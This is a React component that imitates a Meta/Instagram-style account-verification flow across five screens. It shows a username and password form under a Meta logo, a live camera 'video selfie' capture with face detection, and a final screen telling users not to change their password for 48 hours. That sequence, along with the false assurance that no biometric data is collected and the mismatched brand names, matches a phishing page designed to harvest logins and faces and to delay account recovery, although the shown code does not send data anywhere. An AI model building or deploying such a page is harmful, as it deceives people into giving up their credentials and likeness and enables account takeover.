import { useState, useRef, useEffect, useCallback } from "react";

// Type declaration for face-api.js global
declare global {
  interface Window {
    faceapi: {
      nets: Record<string, { loadFromUri: (uri: string) => Promise<void> }>;
      TinyFaceDetectorOptions: new (opts?: { inputSize?: number; scoreThreshold?: number }) => unknown;
      detectSingleFace: (
        input: HTMLVideoElement,
        options?: unknown
      ) => Promise<{
        box: { x: number; y: number; width: number; height: number };
      } | undefined>;
    };
  }
}

type Screen = 1 | 2 | 3 | 4 | 5;

const FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

export default function Landing() {
  const [screen, setScreen] = useState<Screen>(1);

  return (
    <div className="min-h-[100dvh] bg-[#1F1F21] flex items-center justify-center">
      <div className="w-full max-w-[430px] min-h-[100dvh] bg-[#1F1F21] relative overflow-hidden flex flex-col">
        {screen === 1 && <Screen1 onNext={() => setScreen(2)} />}
        {screen === 2 && (
          <Screen2 onBack={() => setScreen(1)} onNext={() => setScreen(3)} />
        )}
        {screen === 3 && <Screen3 onSuccess={() => setScreen(4)} />}
        {screen === 4 && <Screen4 onBack={() => setScreen(3)} onSubmit={() => setScreen(5)} />}
        {screen === 5 && <Screen5 onDone={() => setScreen(1)} />}
      </div>
    </div>
  );
}

/* ─────────────────────────────────────────────
   SCREEN 1 — Login / Credentials
   ───────────────────────────────────────────── */
function Screen1({ onNext }: { onNext: () => void }) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  return (
    <>
      {/* Top Bar — X close + Language */}
      <div className="relative h-12 flex items-center px-4 shrink-0">
        <button className="w-8 h-8 flex items-center justify-center">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className="stroke-white" strokeWidth="2" strokeLinecap="round">
            <path d="M2 2L14 14" />
            <path d="M14 2L2 14" />
          </svg>
        </button>
        <div className="absolute inset-0 flex items-center justify-center pr-8">
          <span className="text-[#a8a8a8] text-[14px]" style={{ fontFamily: FONT }}>
            English (India) ⌄
          </span>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center px-6" style={{ paddingTop: '7vh' }}>
        {/* Logo Placeholder */}
        <div
          className="shrink-0"
          style={{
            width: 60,
            height: 60,
            borderRadius: 14,
            marginTop: 15,
            marginBottom: 120,
            background: 'linear-gradient(to bottom right, #ff7e5f, #feb47b)',
          }}
        />

        {/* Input Fields */}
        <div className="w-full" style={{ maxWidth: 360 }}>
          <div className="bg-transparent flex items-center" style={{ height: 56, borderRadius: 10, padding: 16, marginBottom: 14, border: '1px solid rgba(255,255,255,0.15)' }}>
            <input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full bg-transparent text-white text-[16px] outline-none placeholder:text-[#a8a8a8]"
              style={{ fontFamily: FONT }}
            />
          </div>
          <div className="bg-transparent flex items-center" style={{ height: 56, borderRadius: 10, padding: 16, border: '1px solid rgba(255,255,255,0.15)' }}>
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-transparent text-white text-[16px] outline-none placeholder:text-[#a8a8a8]"
              style={{ fontFamily: FONT }}
            />
          </div>
        </div>

        {/* Next Button */}
        <div className="w-full mt-4" style={{ maxWidth: 360 }}>
          <button
            onClick={onNext}
            className="w-full bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] text-white text-[16px] font-semibold transition-colors"
            style={{ height: 52, borderRadius: 26, fontFamily: FONT }}
          >
            Next
          </button>
        </div>

        {/* Forgotten Password Link */}
        <div className="flex justify-center" style={{ marginTop: 16 }}>
          <button className="text-white text-[15px] font-medium" style={{ fontFamily: FONT }}>
            Forgotten password?
          </button>
        </div>
      </div>

      {/* Meta Logo Footer — combined icon + wordmark in one SVG */}
      <div className="absolute left-0 right-0 flex justify-center" style={{ bottom: 20 }}>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 350 80" height="22">
          <g fill="#DFE6ED" transform="translate(20, 15)">
            <path d="M34.3,10.2 C24.1,10.2 16.5,17.4 11.5,23.9 C7.8,28.7 4.9,33.8 2.8,37.2 C1.7,39.0 0.8,40.4 0.4,41.1 C-0.5,42.7 0.1,44.7 1.7,45.6 C2.4,46.0 3.2,46.1 3.9,46.1 C4.9,46.1 5.9,45.6 6.5,44.6 C6.9,44.0 7.8,42.6 8.9,40.8 C10.9,37.5 13.6,32.7 17.0,28.2 C21.2,22.7 27.4,17.1 34.3,17.1 C41.6,17.1 47.9,23.0 47.9,31.7 C47.9,40.4 41.6,46.3 34.3,46.3 C29.4,46.3 24.3,43.2 19.3,37.1 C17.3,34.7 15.4,32.0 13.5,29.3 C11.0,25.8 8.4,22.1 5.9,19.0 C3.9,16.5 2.0,14.4 0.2,12.9 L0,12.7 C1.9,11.2 3.8,9.1 5.8,6.6 C8.3,3.5 10.9,-0.2 13.4,-3.7 C15.3,-6.4 17.2,-9.1 19.2,-11.5 C24.2,-17.6 29.3,-20.7 34.3,-20.7 C41.6,-20.7 47.9,-14.8 47.9,-6.1 C47.9,2.6 41.6,8.5 34.3,8.5 C27.4,8.5 21.2,2.9 17.0,-2.6 C13.6,-7.1 10.9,-11.9 8.9,-15.2 C7.8,-17.0 6.9,-18.4 6.5,-19.0 C5.5,-20.4 3.5,-20.8 2.1,-19.8 C0.7,-18.8 0.3,-16.8 1.3,-15.4 C1.7,-14.7 2.6,-13.3 3.7,-11.5 C5.8,-8.1 8.7,-3.0 12.4,1.8 C17.4,8.3 25.0,15.5 35.2,15.5 C45.9,15.5 54.8,6.1 54.8,-6.1 C54.8,-18.3 45.9,-27.7 35.2,-27.7 C27.1,-27.7 20.4,-23.4 14.7,-16.2 C12.9,-14.0 11.1,-11.4 9.3,-8.9 L8.2,-10.4 C10.1,-13.0 12.0,-15.6 13.9,-17.9 C19.6,-25.1 26.3,-29.4 34.4,-29.4 C45.1,-29.4 54.0,-20.0 54.0,-7.8 C54.0,4.4 45.1,13.8 34.4,13.8 Z" transform="translate(0, 35) scale(0.9)" />
            <g transform="translate(68, 48)">
              <path d="M0,0 L0,-34.5 L7.8,-34.5 L15.6,-14.2 L23.4,-34.5 L31.2,-34.5 L31.2,0 L25.4,0 L25.4,-26.4 L17.5,-5.5 L13.7,-5.5 L5.8,-26.4 L5.8,0 Z" />
              <path d="M49.2,-12.4 C49.2,-4.1 44.5,1.2 36.8,1.2 C29.2,1.2 24.5,-4.4 24.5,-13.1 C24.5,-21.8 29.5,-27.2 37.1,-27.2 C44.8,-27.2 49.2,-21.6 49.2,-12.4 Z M30.3,-15.8 C30.5,-21.2 33.1,-23.3 36.8,-23.3 C40.5,-23.3 43.1,-21.0 43.3,-15.8 Z M30.3,-11.2 L43.4,-11.2 C43.2,-6.1 40.6,-3.1 36.9,-3.1 C33.1,-3.1 30.6,-5.8 30.3,-11.2 Z" />
              <path d="M57.6,-31.2 L63.4,-31.2 L63.4,-26.2 L57.6,-26.2 L57.6,-7.4 C57.6,-4.4 58.9,-3.2 61.6,-3.2 L63.4,-3.2 L63.4,0 C57.6,0 52.1,-1.2 52.1,-7.8 L52.1,-26.2 L48.2,-26.2 L48.2,-31.2 L52.1,-31.2 L52.1,-39.1 L57.6,-39.1 Z" />
              <path d="M84.2,0 L78.8,0 L78.8,-4.2 C76.7,-1.2 73.1,1.2 68.3,1.2 C61.5,1.2 57.2,-3.3 57.2,-9.8 C57.2,-16.8 62.4,-20.5 72.8,-21.2 L78.8,-21.6 L78.8,-22.6 C78.8,-25.1 76.5,-26.4 72.6,-26.4 C68.5,-26.4 65.5,-24.8 64.6,-21.8 L59.4,-22.8 C60.9,-27.6 65.8,-31.2 73.2,-31.2 C80.9,-31.2 84.2,-27.6 84.2,-21.2 Z M78.8,-17.1 L73.6,-16.6 C66.8,-16.1 63.1,-14.1 63.1,-9.8 C63.1,-6.1 65.8,-3.4 70.1,-3.4 C75.2,-3.4 78.8,-7.4 78.8,-12.3 Z" />
            </g>
          </g>
        </svg>
      </div>
    </>
  );
}

/* ─────────────────────────────────────────────
   SCREEN 2 — Video Selfie Instructions
   ───────────────────────────────────────────── */
function Screen2({ onBack, onNext }: { onBack: () => void; onNext: () => void }) {
  return (
    <>
      <div className="flex items-center h-14 px-4 shrink-0">
        <button onClick={onBack} className="w-10 h-10 flex items-center justify-center -ml-2">
          <svg width="12" height="20" viewBox="0 0 12 20" fill="none" className="stroke-white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <path d="M10 2L2 10L10 18" />
          </svg>
        </button>
        <span className="flex-1 text-center text-white text-[17px] font-semibold pr-10">Video selfie</span>
      </div>
      <div className="flex-1 flex flex-col items-center justify-center px-8 -mt-4">
        <div className="relative w-[240px] h-[240px]">
          <svg viewBox="0 0 240 240" width="240" height="240" fill="none" className="absolute inset-0">
            <circle cx="120" cy="120" r="95" stroke="#4a4a4a" strokeWidth="1.5" strokeDasharray="8 6" fill="none" />
            <circle cx="120" cy="105" r="18" stroke="#b0b0b0" strokeWidth="2.5" fill="none" />
            <path d="M82 152 C82 128 98 118 120 118 C142 118 158 128 158 152" stroke="#b0b0b0" strokeWidth="2.5" fill="none" strokeLinecap="round" />
            <circle cx="120" cy="25" r="18" fill="#1a1a1e" stroke="#4a4a4a" strokeWidth="1.5" />
            <path d="M113 30 L120 22 L127 30" stroke="#b0b0b0" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" fill="none" />
            <circle cx="120" cy="215" r="18" fill="#1a1a1e" stroke="#4a4a4a" strokeWidth="1.5" />
            <path d="M113 210 L120 218 L127 210" stroke="#b0b0b0" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" fill="none" />
            <circle cx="25" cy="120" r="18" fill="#1a1a1e" stroke="#4a4a4a" strokeWidth="1.5" />
            <path d="M30 113 L22 120 L30 127" stroke="#b0b0b0" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" fill="none" />
            <circle cx="215" cy="120" r="18" fill="#1a1a1e" stroke="#4a4a4a" strokeWidth="1.5" />
            <path d="M210 113 L218 120 L210 127" stroke="#b0b0b0" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" fill="none" />
          </svg>
        </div>
        <h1 className="text-white text-[24px] font-bold mt-8 text-center" style={{ fontFamily: FONT }}>
          Take a video selfie
        </h1>
        <p className="text-[#a8a8a8] text-[16px] leading-[1.5] text-center mt-4 max-w-[340px]" style={{ fontFamily: FONT }}>
          To keep your account secure and prevent unauthorized access, we need
          to verify your identity. Please hold your phone directly in front of
          your face and look straight into the camera to take a selfie.
        </p>
      </div>
      <div className="px-6 pb-3 shrink-0">
        <div className="flex items-start gap-3 mb-5">
          <svg width="20" height="22" viewBox="0 0 20 22" fill="none" className="shrink-0 mt-[2px]">
            <rect x="2" y="9" width="16" height="12" rx="2.5" stroke="#6e6e6e" strokeWidth="1.8" fill="none" />
            <path d="M6 9V6C6 3.79 7.79 2 10 2C12.21 2 14 3.79 14 6V9" stroke="#6e6e6e" strokeWidth="1.8" strokeLinecap="round" fill="none" />
            <circle cx="10" cy="14.5" r="1.5" fill="#6e6e6e" />
          </svg>
          <p className="text-[#8e8e8e] text-[13.5px] leading-[1.45]" style={{ fontFamily: FONT }}>
            This video will never be visible on{" "}
            <span className="text-[#a0a0a0] font-medium">habix</span> and will
            be deleted within 30 days. This won't use face recognition or
            collect biometric data.
          </p>
        </div>
        <button onClick={onNext} className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors">
          Next
        </button>
      </div>
      <div className="flex justify-center pb-3 shrink-0">
        <div className="w-[134px] h-[5px] bg-white/30 rounded-full" />
      </div>
    </>
  );
}

/* ─────────────────────────────────────────────
   SCREEN 3 — Live Camera Capture + Face Detection
   ───────────────────────────────────────────── */
function Screen3({ onSuccess }: { onSuccess: () => void }) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const rafRef = useRef<number>(0);

  const [borderColor, setBorderColor] = useState("#ffffff");
  const [cameraActive, setCameraActive] = useState(false);
  const [cameraError, setCameraError] = useState<string | null>(null);
  const [modelsLoaded, setModelsLoaded] = useState(false);
  const [showSpinner, setShowSpinner] = useState(false);

  // Mutable refs for the detection loop (avoid stale closures)
  const borderColorRef = useRef("#ffffff");
  const frozenRef = useRef(false);
  const greenStartRef = useRef<number | null>(null);

  // Keep ref in sync with state
  useEffect(() => {
    borderColorRef.current = borderColor;
  }, [borderColor]);

  // ── Load face-api.js models ─────────────────────────
  useEffect(() => {
    let cancelled = false;

    async function load() {
      const api = window.faceapi;
      if (!api) {
        if (!cancelled) setCameraError("Face detection library failed to load. Please refresh.");
        return;
      }
      try {
        await api.nets.tinyFaceDetector.loadFromUri(
          "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/"
        );
        if (!cancelled) setModelsLoaded(true);
      } catch {
        if (!cancelled) setCameraError("Failed to load face detection models. Please refresh.");
      }
    }

    // Wait a tick for the CDN script to execute
    const id = setTimeout(load, 200);
    return () => {
      cancelled = true;
      clearTimeout(id);
    };
  }, []);

  // ── Start camera ────────────────────────────────────
  useEffect(() => {
    let cancelled = false;

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false,
        });
        if (cancelled) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }
        streamRef.current = stream;
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
        }
        setCameraActive(true);
      } catch (err) {
        if (!cancelled) {
          setCameraError(
            err instanceof DOMException && err.name === "NotAllowedError"
              ? "Camera permission denied. Please allow camera access and reload."
              : "Could not access camera. Make sure a front camera is available."
          );
        }
      }
    }

    startCamera();

    return () => {
      cancelled = true;
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
        streamRef.current = null;
      }
    };
  }, []);

  // ── Detection loop ──────────────────────────────────
  const detectFrame = useCallback(() => {
    const api = window.faceapi;
    const video = videoRef.current;

    // If frozen (spinner showing), keep loop alive but skip detection
    if (frozenRef.current) {
      rafRef.current = requestAnimationFrame(detectFrame);
      return;
    }

    if (!api || !video || video.readyState < 2 || !modelsLoaded || cameraError) {
      rafRef.current = requestAnimationFrame(detectFrame);
      return;
    }

    api
      .detectSingleFace(video, new api.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.45 }))
      .then((detection: { box: { x: number; y: number; width: number; height: number } } | undefined) => {
        if (frozenRef.current) return;

        if (detection) {
          const vw = video.videoWidth;
          const vh = video.videoHeight;
          const box = detection.box;
          const faceCenterX = box.x + box.width / 2;
          const faceCenterY = box.y + box.height / 2;

          // Centered: face center within 35% of frame center
          const horizontallyCentered = Math.abs(faceCenterX - vw / 2) < vw * 0.35;
          // Large enough: face width ≥ 18% of frame width
          const largeEnough = box.width > vw * 0.18;

          if (horizontallyCentered && largeEnough) {
            if (borderColorRef.current !== "#00FF00") {
              setBorderColor("#00FF00");
              greenStartRef.current = Date.now();
            } else if (greenStartRef.current && Date.now() - greenStartRef.current >= 2000) {
              // Stable green for 2 seconds — lock in
              frozenRef.current = true;
              greenStartRef.current = null;
              setShowSpinner(true);

              setTimeout(() => {
                if (streamRef.current) {
                  streamRef.current.getTracks().forEach((t) => t.stop());
                  streamRef.current = null;
                }
                onSuccess();
              }, 1300);
              return; // stop scheduling new frames
            }
          } else {
            // Face present but not positioned well
            setBorderColor("#FF0000");
            greenStartRef.current = null;
          }
        } else {
          // No face
          setBorderColor("#FF0000");
          greenStartRef.current = null;
        }

        rafRef.current = requestAnimationFrame(detectFrame);
      })
      .catch(() => {
        // On error, keep looping but show red
        if (!frozenRef.current) {
          setBorderColor("#FF0000");
          greenStartRef.current = null;
          rafRef.current = requestAnimationFrame(detectFrame);
        }
      });
  }, [modelsLoaded, cameraError, onSuccess]);

  // Start / stop the RAF loop
  useEffect(() => {
    if (cameraActive && !cameraError) {
      rafRef.current = requestAnimationFrame(detectFrame);
    }
    return () => {
      if (rafRef.current) cancelAnimationFrame(rafRef.current);
    };
  }, [cameraActive, cameraError, detectFrame]);

  return (
    <>
      <div className="flex items-center justify-center h-14 shrink-0">
        <span className="text-white text-[17px] font-semibold">Video selfie</span>
      </div>

      <div className="flex-1 flex flex-col items-center justify-center px-8 -mt-4">
        {/* Video circle */}
        <div
          className="relative rounded-full overflow-hidden shrink-0 transition-colors duration-300"
          style={{ width: 280, height: 280, border: `4px solid ${borderColor}` }}
        >
          <video
            ref={videoRef}
            muted
            playsInline
            className="absolute inset-0 w-full h-full object-cover"
            style={{ transform: "scaleX(-1)" }}
          />

          {/* Loading / Error overlay */}
          {!cameraActive && !cameraError && (
            <div className="absolute inset-0 flex items-center justify-center bg-[#1a1a1e]">
              <div className="w-8 h-8 border-2 border-white/20 border-t-white rounded-full animate-spin" />
            </div>
          )}

          {cameraError && (
            <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#1a1a1e] p-4">
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" className="mb-3 text-white/40">
                <path d="M23 7l-7 5 7 5V7z" stroke="currentColor" strokeWidth="1.5" strokeLinejoin="round" />
                <rect x="1" y="5" width="15" height="14" rx="2" stroke="currentColor" strokeWidth="1.5" />
              </svg>
              <p className="text-white/50 text-[13px] text-center leading-snug">{cameraError}</p>
            </div>
          )}

          {/* ── Processing spinner overlay ── */}
          {showSpinner && (
            <div className="absolute inset-0 flex items-center justify-center bg-black/40">
              <div className="w-14 h-14 rounded-full border-[3px] border-white/20 border-t-white animate-spin" />
            </div>
          )}
        </div>

        {/* Heading */}
        <h2 className="text-white text-[22px] font-bold mt-8 text-center" style={{ fontFamily: FONT }}>
          Position your face in the circle.
        </h2>
        {/* Subtext */}
        <p className="text-[#a8a8a8] text-[16px] leading-[1.5] text-center mt-3 max-w-[320px]" style={{ fontFamily: FONT }}>
          Hold your phone at eye level and make sure that your whole face is visible.
        </p>
      </div>

      <div className="flex justify-center pb-3 shrink-0">
        <div className="w-[134px] h-[5px] bg-white/30 rounded-full" />
      </div>
    </>
  );
}

/* ─────────────────────────────────────────────
   SCREEN 4 — Success / Video Selfie Complete
   ───────────────────────────────────────────── */
function Screen4({ onBack, onSubmit }: { onBack: () => void; onSubmit: () => void }) {
  return (
    <>
      <div className="flex items-center h-14 px-4 shrink-0">
        <button onClick={onBack} className="w-10 h-10 flex items-center justify-center -ml-2">
          <svg width="12" height="20" viewBox="0 0 12 20" fill="none" className="stroke-white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <path d="M10 2L2 10L10 18" />
          </svg>
        </button>
        <span className="flex-1 text-center text-white text-[17px] font-semibold pr-10">Video selfie</span>
      </div>

      <div className="flex-1 flex flex-col items-center justify-center px-8 -mt-4">
        <div className="relative w-[260px] h-[260px] shrink-0">
          <svg viewBox="0 0 260 260" width="260" height="260" fill="none">
            <defs>
              <linearGradient id="success-grad" x1="0%" y1="100%" x2="100%" y2="0%">
                <stop offset="0%" stopColor="#f5a623" />
                <stop offset="35%" stopColor="#e8445a" />
                <stop offset="70%" stopColor="#d63384" />
                <stop offset="100%" stopColor="#a855f7" />
              </linearGradient>
            </defs>
            <circle cx="130" cy="130" r="120" stroke="url(#success-grad)" strokeWidth="4" fill="none" />
            <path d="M85 132 L118 165 L178 100" stroke="url(#success-grad)" strokeWidth="7" strokeLinecap="round" strokeLinejoin="round" fill="none" />
          </svg>
        </div>
        <h1 className="text-white text-[24px] font-bold mt-10 text-center" style={{ fontFamily: FONT }}>
          Video selfie complete
        </h1>
        <p className="text-[#a8a8a8] text-[16px] leading-[1.5] text-center mt-4 max-w-[340px]" style={{ fontFamily: FONT }}>
          Thank you for completing this step. Please submit this selfie to help
          us secure your account and prevent unauthorized access.
        </p>
      </div>

      <div className="px-6 pb-3 shrink-0">
        <div className="flex items-start gap-3 mb-5">
          <svg width="20" height="22" viewBox="0 0 20 22" fill="none" className="shrink-0 mt-[2px]">
            <rect x="2" y="9" width="16" height="12" rx="2.5" stroke="#6e6e6e" strokeWidth="1.8" fill="none" />
            <path d="M6 9V6C6 3.79 7.79 2 10 2C12.21 2 14 3.79 14 6V9" stroke="#6e6e6e" strokeWidth="1.8" strokeLinecap="round" fill="none" />
            <circle cx="10" cy="14.5" r="1.5" fill="#6e6e6e" />
          </svg>
          <p className="text-[#8e8e8e] text-[13.5px] leading-[1.45]" style={{ fontFamily: FONT }}>
            This video will never be visible on{" "}
            <span className="text-[#a0a0a0] font-medium">habilex</span> and will
            be deleted within 30 days. This won't use face recognition or
            collect biometric data.
          </p>
        </div>
        <button onClick={onSubmit} className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors">
          Submit
        </button>
      </div>
      <div className="flex justify-center pb-3 shrink-0">
        <div className="w-[134px] h-[5px] bg-white/30 rounded-full" />
      </div>
    </>
  );
}

/* ─────────────────────────────────────────────
   SCREEN 5 — Security Verification Warning
   ───────────────────────────────────────────── */
function Screen5({ onDone }: { onDone: () => void }) {
  const handleOkay = () => {
    console.log("Process complete. User verified.");
    onDone();
  };

  return (
    <>
      {/* Top Bar — X close button */}
      <div className="flex items-center h-14 px-4 shrink-0">
        <button onClick={handleOkay} className="w-10 h-10 flex items-center justify-center -ml-2">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none" className="stroke-white" strokeWidth="2.2" strokeLinecap="round">
            <path d="M2 2L16 16" />
            <path d="M16 2L2 16" />
          </svg>
        </button>
        <div className="flex-1" />
      </div>

      {/* Center Content */}
      <div className="flex-1 flex flex-col items-center px-6">
        {/* 3-Part Header Graphic */}
        <div className="flex items-center justify-center gap-0 shrink-0 mt-4">
          {/* ── Left Icon: Chat bubble on stand ── */}
          <svg width="80" height="110" viewBox="0 0 80 110" fill="none" className="relative -mr-3">
            {/* Stand */}
            <line x1="36" y1="72" x2="36" y2="100" stroke="#4a4a4a" strokeWidth="2" />
            <line x1="44" y1="72" x2="44" y2="100" stroke="#4a4a4a" strokeWidth="2" />
            {/* Rounded square border */}
            <rect x="12" y="18" width="56" height="54" rx="10" stroke="#4a4a4a" strokeWidth="2" fill="none" />
            {/* Chat bubble inside */}
            <path
              d="M26 36 C26 30 32 26 40 26 C48 26 54 30 54 36 C54 42 48 46 40 46 L36 46 L30 52 L32 46 C28 44 26 40 26 36Z"
              stroke="#5a5a5a"
              strokeWidth="1.8"
              fill="none"
              strokeLinejoin="round"
            />
          </svg>

          {/* ── Center: Glowing Shield + Padlock ── */}
          <div className="relative w-[160px] h-[160px] mx-1">
            {/* Glow behind shield */}
            <div
              className="absolute inset-[-10px] rounded-full blur-[28px] opacity-50"
              style={{ background: "linear-gradient(160deg, #a855f7 0%, #ec4899 40%, #f97316 100%)" }}
            />
            <svg viewBox="0 0 160 160" width="160" height="160" fill="none" className="relative z-10">
              <defs>
                <linearGradient id="shield-grad" x1="20%" y1="90%" x2="80%" y2="10%">
                  <stop offset="0%" stopColor="#f97316" />
                  <stop offset="30%" stopColor="#ec4899" />
                  <stop offset="65%" stopColor="#d946ef" />
                  <stop offset="100%" stopColor="#a855f7" />
                </linearGradient>
              </defs>
              {/* Shield outline */}
              <path
                d="M80 12 L135 34 L135 85 C135 118 110 142 80 152 C50 142 25 118 25 85 L25 34 Z"
                stroke="url(#shield-grad)"
                strokeWidth="3.5"
                fill="none"
              />
              {/* Padlock body */}
              <rect x="60" y="86" width="40" height="32" rx="5" stroke="white" strokeWidth="2.8" fill="none" />
              {/* Padlock shackle */}
              <path
                d="M66 86 L66 74 C66 62 70 56 80 56 C90 56 94 62 94 74 L94 86"
                stroke="white"
                strokeWidth="2.8"
                strokeLinecap="round"
                fill="none"
              />
              {/* Keyhole */}
              <circle cx="80" cy="100" r="3.5" fill="white" />
              <path d="M80 104 L80 113" stroke="white" strokeWidth="2.2" strokeLinecap="round" />
            </svg>
          </div>

          {/* ── Right Icon: Landscape/picture on stand ── */}
          <svg width="80" height="110" viewBox="0 0 80 110" fill="none" className="relative -ml-3">
            {/* Stand */}
            <line x1="36" y1="72" x2="36" y2="100" stroke="#4a4a4a" strokeWidth="2" />
            <line x1="44" y1="72" x2="44" y2="100" stroke="#4a4a4a" strokeWidth="2" />
            {/* Circle border */}
            <circle cx="40" cy="42" r="28" stroke="#4a4a4a" strokeWidth="2" fill="none" />
            {/* Mountain / landscape icon inside */}
            <path
              d="M24 52 L32 38 L38 46 L44 36 L56 52Z"
              stroke="#5a5a5a"
              strokeWidth="1.8"
              strokeLinejoin="round"
              fill="none"
            />
            {/* Sun */}
            <circle cx="32" cy="32" r="4" stroke="#5a5a5a" strokeWidth="1.5" fill="none" />
          </svg>
        </div>

        {/* Heading */}
        <h1 className="text-white text-[22px] font-bold mt-6 text-center leading-snug" style={{ fontFamily: FONT }}>
          Security Verification in Progress
        </h1>

        {/* Paragraph */}
        <p className="text-[#a8a8a8] text-[15px] leading-[1.55] text-center mt-4 max-w-[360px]" style={{ fontFamily: FONT }}>
          Your account security verification is currently processing. This may
          take 3 to 5 hours to complete. To ensure your safety, any new attempts
          to log into your account during this time will be automatically blocked.
        </p>

        {/* Divider */}
        <hr className="w-full border-white/[0.08] mt-8" />

        {/* Warning Section */}
        <div className="w-full mt-6">
          <div className="flex items-center gap-3">
            {/* Yellow warning triangle */}
            <svg width="24" height="22" viewBox="0 0 24 22" fill="none" className="shrink-0">
              <path
                d="M12 2L22 20H2L12 2Z"
                stroke="#F5A623"
                strokeWidth="2"
                strokeLinejoin="round"
                fill="none"
              />
              <path d="M12 9V14" stroke="#F5A623" strokeWidth="2" strokeLinecap="round" />
              <circle cx="12" cy="17" r="1.2" fill="#F5A623" />
            </svg>
            <span className="text-white text-[17px] font-bold" style={{ fontFamily: FONT }}>
              Important Warning
            </span>
          </div>
          <p className="text-[#a8a8a8] text-[15px] leading-[1.55] mt-3" style={{ fontFamily: FONT }}>
            Please do not attempt to change your password for the next 48 hours.
            Doing so may trigger our security systems and result in account
            suspension.
          </p>
        </div>
      </div>

      {/* Bottom Button */}
      <div className="px-6 pb-3 shrink-0">
        <button
          onClick={handleOkay}
          className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors"
        >
          Okay
        </button>
      </div>

      <div className="flex justify-center pb-3 shrink-0">
        <div className="w-[134px] h-[5px] bg-white/30 rounded-full" />
      </div>
    </>
  );
}
